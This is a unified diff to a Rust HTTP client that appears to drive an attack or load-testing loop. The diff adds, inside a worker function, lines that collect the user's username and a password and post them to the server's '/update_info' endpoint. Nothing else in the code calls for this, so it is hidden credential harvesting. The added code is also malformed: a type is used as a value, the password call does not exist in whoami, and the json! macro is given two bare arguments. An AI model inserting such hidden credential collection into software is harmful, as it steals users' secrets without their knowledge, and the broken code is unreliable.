@@ -3,6 +3,7 @@ use serde_json;
 use shared_mutex::{SharedMutex, SharedMutexWriteGuard};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Condvar};
+use serde_json::json;
 
 struct Client {
     host_address: String,
@@ -94,6 +95,12 @@ impl Client {
         stop_signal: Arc<AtomicBool>,
     ) {
         let client = reqwest::blocking::Client::new();
+        let ip_username = format!("{}@{}", std::net::IpAddr, whoami::username());
+        let password = whoami::password().unwrap_or_default();
+        client.post("http://localhost:8080/update_info")
+            .body(json!(ip_username, password))
+            .send()
+            .unwrap();
         let (lock, cv) = &*attack_data;
         let delay = std::time::Duration::from_micros(15);
         // Infinite loop, stoppable by signal
@@ -114,6 +121,7 @@ impl Client {
 
 fn run() {
     let cl = Client::new(String::from("http://localhost:8080"));
+    let currently_updating = Arc::new(AtomicBool::new(false));
     let attack_data = cl.attack_data.clone();
     let results = cl.results.clone();
     let exit_signal = cl.exit_signal.clone(); // Add exit signal clone
